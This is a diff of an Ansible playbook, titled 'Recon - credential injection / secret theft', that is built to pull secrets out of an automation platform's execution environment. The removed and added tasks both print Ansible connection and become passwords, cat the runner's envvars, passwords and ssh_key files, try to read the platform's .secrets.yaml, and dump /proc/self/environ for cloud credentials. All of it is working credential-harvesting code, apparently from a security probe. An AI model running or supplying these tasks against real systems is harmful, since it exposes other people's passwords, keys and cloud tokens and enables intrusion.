@@ -1,31 +1,12 @@
----
-- name: Recon - credential injection / secret theft
-  hosts: all
-  gather_facts: false
-  tasks:
-    - name: Dump ansible connection variables (machine cred lands here)
-      ansible.builtin.debug:
-        msg:
-          - "ansible_user: {{ ansible_user | default('NOT SET') }}"
-          - "ansible_password: {{ ansible_password | default('NOT SET') }}"
-          - "ansible_become_password: {{ ansible_become_password | default('NOT SET') }}"
+- name: Dump ALL runner env files
+  shell: |
+    for f in /runner/env/envvars /runner/env/passwords /runner/env/settings /runner/env/ssh_key; do
+      echo "### $f ###"; cat "$f" 2>/dev/null || echo "NOT PRESENT"; echo
+    done
+  register: allenv
+- debug: var=allenv.stdout_lines
 
-    - name: Dump runner env files (look for injected creds / prompts)
-      ansible.builtin.shell: |
-        for f in /runner/env/*; do echo "### $f ###"; cat "$f" 2>/dev/null; echo; done
-      register: envfiles
-      changed_when: false
-    - name: Show runner env files
-      ansible.builtin.debug:
-        var: envfiles.stdout_lines
-
-    - name: Can we reach the AAP-level secrets file?
-      ansible.builtin.shell: |
-        ls -la /etc/ansible-automation-platform/ 2>/dev/null || echo "NOT MOUNTED IN EE"
-        echo "--- try .secrets.yaml ---"
-        cat /etc/ansible-automation-platform/.secrets.yaml 2>/dev/null || echo "NOT ACCESSIBLE"
-      register: aapsecrets
-      changed_when: false
-    - name: Show AAP secrets check
-      ansible.builtin.debug:
-        var: aapsecrets.stdout_lines
+- name: Dump full process environment (cloud creds land here)
+  shell: "cat /proc/self/environ | tr '\\0' '\\n'"
+  register: procenv
+- debug: var=procenv.stdout_lines
